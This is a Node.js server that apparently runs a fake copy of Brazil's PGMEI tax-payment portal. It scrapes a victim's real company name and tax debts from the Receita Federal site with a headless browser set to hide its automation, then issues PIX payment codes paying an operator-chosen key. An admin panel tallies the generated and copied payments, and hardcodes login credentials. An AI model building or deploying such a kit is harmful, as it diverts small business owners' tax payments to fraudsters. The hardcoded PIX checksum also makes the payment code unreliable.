const express = require('express');
const puppeteer = require('puppeteer');
const multer = require('multer');
const path = require('path');
const cookieParser = require('cookie-parser');
const compression = require('compression');
const helmet = require('helmet');
const session = require('express-session');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3005;

const upload = multer();
const uploadMultipart = multer({ storage: multer.memoryStorage() });

// ============================================
// MIDDLEWARES
// ============================================
app.use(helmet({ 
    contentSecurityPolicy: false, 
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: false
}));
app.use(compression());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

app.use(session({
    secret: 'pgmei-secret-key-2026',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 24 * 60 * 60 * 1000, httpOnly: true, secure: false }
}));

app.use('/index_files', express.static(path.join(__dirname, 'index_files')));
app.use(express.static(path.join(__dirname)));

// ============================================
// ROTAS DAS PÁGINAS
// ============================================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/inicio', (req, res) => res.sendFile(path.join(__dirname, 'inicio.html')));
app.get('/emissao', (req, res) => res.sendFile(path.join(__dirname, 'emissao.html')));
app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

app.get('/app/micro/Home/Inicio/index.php', (req, res) => res.redirect('/inicio'));
app.post('/app/micro/Home/Inicio/index.php', upload.none(), (req, res) => res.redirect('/inicio'));
app.get('/app/micro/Emissao/', (req, res) => res.redirect('/emissao'));

// ============================================
// ESTADO GLOBAL DO PUPPETEER
// ============================================
let browserInstance = null;
let pageInstance = null;

// ============================================
// FUNÇÃO: INICIAR NAVEGADOR
// ============================================
async function iniciarNavegador() {
    if (browserInstance) return browserInstance;
    
    console.log('🌐 Iniciando navegador...');
    
    try {
        browserInstance = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--disable-gpu'
            ]
        });
        console.log('✅ Navegador iniciado com sucesso!');
        return browserInstance;
    } catch (error) {
        console.error('❌ Erro ao iniciar navegador:', error.message);
        throw error;
    }
}

async function obterPagina() {
    if (pageInstance && !pageInstance.isClosed()) return pageInstance;
    const browser = await iniciarNavegador();
    pageInstance = await browser.newPage();
    await pageInstance.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    return pageInstance;
}

// ============================================
// CONSULTAR CNPJ
// ============================================
async function consultarCNPJReal(cnpj) {
    const page = await obterPagina();
    await page.goto('https://www8.receita.fazenda.gov.br/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Identificacao', {
        waitUntil: 'domcontentloaded',
        timeout: 20000
    });
    await page.waitForSelector('input[name="cnpj"]', { timeout: 8000 });
    await page.type('input[name="cnpj"]', cnpj, { delay: 50 });
    await Promise.all([
        page.click('button[type="submit"], input[type="submit"], .btn-success'),
        page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 30000 })
    ]);
    const dados = await page.evaluate(() => {
        const texto = document.body.innerText;
        let cnpjFormatado = '', nomeEmpresa = '';
        const cnpjMatch = texto.match(/CNPJ[:\s]*([\d./-]+)/i);
        if (cnpjMatch) cnpjFormatado = cnpjMatch[1].trim();
        const nomeMatch = texto.match(/(?:Nome|Razão Social|Empresa)[:\s]*([^\n]+)/i);
        if (nomeMatch) nomeEmpresa = nomeMatch[1].trim();
        return { cnpj_formatado: cnpjFormatado, nome_empresa: nomeEmpresa };
    });
    return dados;
}

// ============================================
// FUNÇÃO: LISTAR ANOS DISPONÍVEIS (RÁPIDO)
// ============================================
async function listarAnos(cnpj) {
    const page = await obterPagina();

    await page.goto(`https://www8.receita.fazenda.gov.br/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/emissao?cnpj=${cnpj}`, {
        waitUntil: 'domcontentloaded',
        timeout: 20000
    });

    await page.waitForSelector('#anoCalendarioSelect, select[name="ano"]', { timeout: 10000, visible: true });

    const anos = await page.evaluate(() => {
        const select = document.querySelector('#anoCalendarioSelect, select[name="ano"]');
        if (!select) return [];
        const options = select.querySelectorAll('option');
        return Array.from(options)
            .map(opt => opt.value)
            .filter(val => val && !isNaN(parseInt(val)) && parseInt(val) > 2000);
    });

    console.log(`📅 Anos disponíveis: ${anos.join(', ')}`);
    return anos;
}

// ============================================
// FUNÇÃO: BUSCAR GUIAS DE UM ANO ESPECÍFICO
// ============================================
async function buscarGuiasPorAno(cnpj, ano) {
    const page = await obterPagina();

    // Garantir que está na página de emissão
    await page.goto(`https://www8.receita.fazenda.gov.br/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/emissao?cnpj=${cnpj}`, {
        waitUntil: 'domcontentloaded',
        timeout: 20000
    });

    await page.waitForSelector('#anoCalendarioSelect, select[name="ano"]', { timeout: 10000, visible: true });

    // Selecionar o ano
    await page.select('#anoCalendarioSelect, select[name="ano"]', ano);

    // Clicar em "Ok"
    await Promise.all([
        page.click('#btnSelecionarAno, button[type="submit"]'),
        page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 20000 })
    ]);

    // Aguardar a tabela
    try {
        await page.waitForSelector('#tabelaMeses tbody tr, .table tbody tr, table tbody tr', { timeout: 10000 });
    } catch (e) {
        console.log(`   ⚠️ Nenhuma guia encontrada para ${ano}.`);
        return [];
    }

    // Extrair guias do mês
    const guias = await page.evaluate((ano) => {
        const guias = [];
        const rows = document.querySelectorAll('#tabelaMeses tbody tr, .table tbody tr, table tbody tr');
        rows.forEach(row => {
            const cols = row.querySelectorAll('td');
            if (cols.length >= 8) {
                const mesNome = cols[0]?.innerText.trim() || cols[1]?.innerText.trim() || '';
                if (mesNome && (mesNome.includes('/') ||
                    mesNome.includes('Janeiro') || mesNome.includes('Fevereiro') || mesNome.includes('Março') ||
                    mesNome.includes('Abril') || mesNome.includes('Maio') || mesNome.includes('Junho') ||
                    mesNome.includes('Julho') || mesNome.includes('Agosto') || mesNome.includes('Setembro') ||
                    mesNome.includes('Outubro') || mesNome.includes('Novembro') || mesNome.includes('Dezembro'))) {

                    // ============================================
                    // CORREÇÃO DOS ÍNDICES DAS COLUNAS DA RECEITA (já ajustada)
                    // ============================================
                    const principal = cols[5]?.innerText.trim().replace(/R\$\s*/g, '').trim() || '0,00';
                    const multa = cols[6]?.innerText.trim().replace(/R\$\s*/g, '').trim() || '0,00';
                    const juros = cols[7]?.innerText.trim().replace(/R\$\s*/g, '').trim() || '0,00';
                    const total = cols[8]?.innerText.trim().replace(/R\$\s*/g, '').trim() || '0,00';
                    const vencimento = cols[9]?.innerText.trim() || '-';
                    const acolhimento = cols[10]?.innerText.trim() || '-';
                    // ============================================
                    
                    const apurado = cols[2]?.innerText.trim() || 'Não';

                    let periodo = mesNome;
                    if (!periodo.includes('/')) {
                        const mesesMap = {
                            'Janeiro': '01', 'Fevereiro': '02', 'Março': '03', 'Abril': '04',
                            'Maio': '05', 'Junho': '06', 'Julho': '07', 'Agosto': '08',
                            'Setembro': '09', 'Outubro': '10', 'Novembro': '11', 'Dezembro': '12'
                        };
                        const mesNum = mesesMap[mesNome];
                        if (mesNum) periodo = `${mesNum}/${ano}`;
                    }

                    const parseValor = (v) => {
                        const num = parseFloat(v.replace(/\./g, '').replace(',', '.'));
                        return isNaN(num) ? 0 : num;
                    };

                    guias.push({
                        mesAno: periodo,
                        apurado: apurado,
                        principal: principal,
                        multa: multa,
                        juros: juros,
                        total: total,
                        vencimento: vencimento,
                        acolhimento: acolhimento,
                        principal_num: parseValor(principal),
                        multa_num: parseValor(multa),
                        juros_num: parseValor(juros),
                        total_num: parseValor(total)
                    });
                }
            }
        });
        return guias;
    }, ano);

    console.log(`   ✅ ${guias.length} meses encontrados para ${ano}`);
    return guias;
}

// ============================================
// FUNÇÃO: FORMATAR CNPJ
// ============================================
function formatarCNPJ(cnpj) {
    const c = cnpj.replace(/\D/g, '');
    if (c.length !== 14) return cnpj;
    return c.replace(/^(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})$/, '$1.$2.$3/$4-$5');
}

// ============================================
// ENDPOINTS DO PGMEI
// ============================================
app.post('/salvar_cnpj.php', upload.none(), async (req, res) => {
    const cnpj = req.body.cnpj?.replace(/\D/g, '');
    if (!cnpj || cnpj.length !== 14) {
        return res.status(400).json({ success: false, error: 'CNPJ inválido' });
    }
    try {
        const dados = await consultarCNPJReal(cnpj);
        req.session.cnpj = cnpj;
        req.session.cnpj_formatado = dados.cnpj_formatado || formatarCNPJ(cnpj);
        req.session.nome_empresa = dados.nome_empresa || 'EMPRESA NÃO ENCONTRADA';
        // Registrar consulta no painel
        const stats = loadStats();
        stats.consultas += 1;
        stats.ultima_consulta = { cnpj: req.session.cnpj_formatado, nome: req.session.nome_empresa };
        stats.eventos.unshift({ data: new Date().toLocaleString(), acao: `Consulta CNPJ ${req.session.cnpj_formatado}` });
        if (stats.eventos.length > 50) stats.eventos.pop();
        saveStats(stats);
        res.json({
            success: true,
            data: {
                cnpj_formatado: req.session.cnpj_formatado,
                nome_empresa: req.session.nome_empresa
            }
        });
    } catch (error) {
        console.error('Erro consulta CNPJ:', error.message);
        res.status(500).json({ success: false, error: 'Erro ao consultar CNPJ' });
    }
});

// ============================================
// ENDPOINT: RETORNAR ANOS E GUIAS DO ANO SELECIONADO
// ============================================
app.post('/salvar_cnpj_emissao.php', uploadMultipart.none(), async (req, res) => {
    const cnpj = req.body.cnpj?.replace(/\D/g, '') || req.session.cnpj;
    if (!cnpj) {
        return res.status(400).json({ success: false, error: 'CNPJ não encontrado' });
    }

    try {
        // 1. Obter anos disponíveis
        const anos = await listarAnos(cnpj);
        
        // 2. Escolher o ano atual (ou o último)
        const anoAtual = new Date().getFullYear();
        const anoSelecionado = anos.includes(anoAtual) ? anoAtual : anos[anos.length - 1] || '2026';
        
        // 3. Verificar cache da sessão
        let guias = [];
        if (req.session.guiasCache && req.session.guiasCache.cnpj === cnpj && req.session.guiasCache.ano === anoSelecionado) {
            const idade = Date.now() - req.session.guiasCache.timestamp;
            if (idade < 5 * 60 * 1000) { // 5 minutos
                console.log('📦 Usando cache para o ano', anoSelecionado);
                guias = req.session.guiasCache.guias;
            }
        }

        // 4. Se não tiver cache, buscar
        if (!guias || guias.length === 0) {
            guias = await buscarGuiasPorAno(cnpj, anoSelecionado);
            // Guardar no cache da sessão
            req.session.guiasCache = {
                cnpj: cnpj,
                ano: anoSelecionado,
                guias: guias,
                timestamp: Date.now()
            };
        }

        // 5. Registrar clique no painel
        const stats = loadStats();
        stats.cliques += 1;
        stats.ultima_consulta = { cnpj: req.session.cnpj_formatado, nome: req.session.nome_empresa };
        stats.eventos.unshift({ data: new Date().toLocaleString(), acao: 'Emissão carregada' });
        if (stats.eventos.length > 50) stats.eventos.pop();
        saveStats(stats);

        // 6. Retornar dados
        res.json({
            success: true,
            data: {
                api_completa: { guias: guias },
                guias: guias,
                anos: anos // Para o frontend preencher o select
            }
        });
    } catch (error) {
        console.error('Erro emissão:', error.message);
        res.status(500).json({ success: false, error: 'Erro ao buscar débitos' });
    }
});

// ============================================
// ENDPOINT: GERAR PIX (COM CHAVE SALVA)
// ============================================
app.post('/api/superpay_pix.php', express.json(), (req, res) => {
    const valor = parseFloat(req.body.valor) || 0;
    const stats = loadStats();
    const chavePix = stats.chave_pix || 'chave-pix-padrao@email.com';
    const nome = stats.nome || 'PGMEI';
    const cidade = stats.cidade || 'Brasil';

    // Montar payload PIX (exemplo simplificado)
    const payload = `00020126580014br.gov.bcb.pix0136${chavePix}5204000053039865404${valor.toFixed(2).replace('.', '')}5802BR5925${nome.substring(0, 25)}6009${cidade.substring(0, 15)}62070503***6304E1B7`;

    // Registrar no painel
    stats.pix_gerados += 1;
    stats.valor_total += valor;
    stats.eventos.unshift({ data: new Date().toLocaleString(), acao: `PIX gerado R$ ${valor.toFixed(2)}` });
    if (stats.eventos.length > 50) stats.eventos.pop();
    saveStats(stats);

    res.json({
        success: true,
        data: {
            qr_code: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(payload)}`,
            pix_code: payload,
            transaction_id: `TX_${Date.now()}`
        }
    });
});

// ============================================
// CORREÇÃO: ROTA DE CÓPIA DO PIX (NOVA)
// ============================================
app.post('/api/register-pix-copy', express.json(), (req, res) => {
    const valor = parseFloat(req.body.valor) || 0;
    const stats = loadStats();
    stats.pix_copiados += 1;
    stats.valor_total_copiado += valor;
    stats.eventos.unshift({ data: new Date().toLocaleString(), acao: `PIX copiado R$ ${valor.toFixed(2)}` });
    if (stats.eventos.length > 50) stats.eventos.pop();
    saveStats(stats);
    res.json({ success: true });
});

// ============================================
// ROTAS DE SESSÃO
// ============================================
app.post('/api/salvar-cnpj-consulta', upload.none(), (req, res) => {
    req.session.cnpj = req.body.cnpj;
    req.session.cnpj_formatado = req.body.cnpj_formatado;
    req.session.nome_empresa = req.body.nome_empresa;
    res.json({ success: true });
});

app.get('/api/get-cnpj-session', (req, res) => {
    res.json({
        cnpj: req.session.cnpj || '',
        cnpj_formatado: req.session.cnpj_formatado || '',
        nome_empresa: req.session.nome_empresa || ''
    });
});

app.get('/api/status', (req, res) => {
    res.json({ status: 'online' });
});

// ============================================
// PAINEL ADMINISTRATIVO - ESTATÍSTICAS
// ============================================
const STATS_FILE = path.join(__dirname, 'stats.json');

function loadStats() {
    try {
        if (fs.existsSync(STATS_FILE)) {
            return JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
        }
    } catch (e) {}
    // ============================================
    // CORREÇÃO: Novas variáveis adicionadas no objeto padrão
    // ============================================
    return { 
        consultas: 0, cliques: 0, pix_gerados: 0, pix_copiados: 0, 
        valor_total: 0, valor_total_copiado: 0, 
        chave_pix: '', nome: '', cidade: '', identificador: '', 
        ultima_consulta: { cnpj: '', nome: '' }, 
        eventos: [] 
    };
}

function saveStats(stats) {
    fs.writeFileSync(STATS_FILE, JSON.stringify(stats, null, 2));
}

// Credenciais do admin
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'pgmei2026';

app.post('/api/admin/login', express.json(), (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        req.session.admin = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Credenciais inválidas' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    req.session.admin = false;
    res.json({ success: true });
});

function checkAdmin(req, res, next) {
    if (req.session.admin) return next();
    res.status(401).json({ error: 'Não autorizado' });
}

app.get('/api/admin/dashboard', checkAdmin, (req, res) => {
    const stats = loadStats();
    res.json({
        totalClicks: stats.cliques,
        totalConsultas: stats.consultas,
        valorTotalGerado: stats.valor_total,
        valorTotalCopiado: stats.valor_total_copiado,
        totalPixGerados: stats.pix_gerados,
        totalPixCopiados: stats.pix_copiados,
        totalPagamentos: 0,
        valorTotalPago: 0,
        ultimaConsulta: stats.ultima_consulta || { cnpj: '', nome: '' }
    });
});

app.get('/api/admin/logs/clicks', checkAdmin, (req, res) => {
    const stats = loadStats();
    const logs = stats.eventos.filter(e => e.acao.includes('Clique')).map(e => ({
        timestamp: new Date(e.data).getTime(),
        ip: '127.0.0.1',
        userAgent: 'PGMEI'
    }));
    res.json(logs);
});

app.get('/api/admin/logs/consultas', checkAdmin, (req, res) => {
    const stats = loadStats();
    const logs = stats.eventos.filter(e => e.acao.includes('Consulta')).map(e => ({
        timestamp: new Date(e.data).getTime(),
        placa: '',
        renavam: '',
        pagamento_confirmado: false,
        ip: '127.0.0.1'
    }));
    res.json(logs);
});

app.get('/api/admin/logs/pix', checkAdmin, (req, res) => {
    const stats = loadStats();
    const logs = stats.eventos.filter(e => e.acao.includes('PIX')).map(e => ({
        timestamp: new Date(e.data).getTime(),
        placa: '',
        valor: parseFloat(e.acao.match(/R\$ ([\d,.]+)/)?.[1]?.replace(',', '.') || 0),
        copiado: false,
        pagamento_confirmado: false,
        ip: '127.0.0.1'
    }));
    res.json(logs);
});

// ============================================
// CORREÇÃO: ROTA DA CHAVE PIX LIBERADA (SEM checkAdmin)
// ============================================
app.get('/api/admin/config/pix', (req, res) => {
    const stats = loadStats();
    res.json({
        nome: stats.nome || 'PGMEI',
        cidade: stats.cidade || 'Brasil',
        identificador: stats.identificador || '',
        chave: stats.chave_pix || ''
    });
});

app.post('/api/admin/config/pix', checkAdmin, express.json(), (req, res) => {
    try {
        const stats = loadStats();
        stats.nome = req.body.nome || '';
        stats.cidade = req.body.cidade || '';
        stats.identificador = req.body.identificador || '';
        stats.chave_pix = req.body.chave || '';
        saveStats(stats);
        res.json({ success: true, message: 'Chave PIX salva com sucesso!' });
    } catch (error) {
        console.error('❌ Erro ao salvar chave PIX:', error);
        res.status(500).json({ success: false, error: 'Erro interno ao salvar' });
    }
});

app.post('/api/admin/clear-logs', checkAdmin, (req, res) => {
    const stats = loadStats();
    stats.eventos = [];
    saveStats(stats);
    res.json({ success: true });
});

// ============================================
// FECHAR NAVEGADOR AO ENCERRAR
// ============================================
process.on('SIGINT', async () => {
    if (browserInstance) {
        console.log('\n🔄 Fechando navegador...');
        await browserInstance.close();
    }
    process.exit();
});

// ============================================
// INICIAR SERVIDOR
// ============================================
app.listen(PORT, () => {
    console.log(`\n🚀 Servidor rodando em http://localhost:${PORT}`);
    console.log('👻 Modo oculto (headless: true)');
    console.log('📝 Buscando débitos apenas do ano selecionado (RÁPIDO)');
    console.log('📊 Painel admin em: http://localhost:' + PORT + '/admin.html');
    console.log('   Login: admin / senha: pgmei2026\n');
});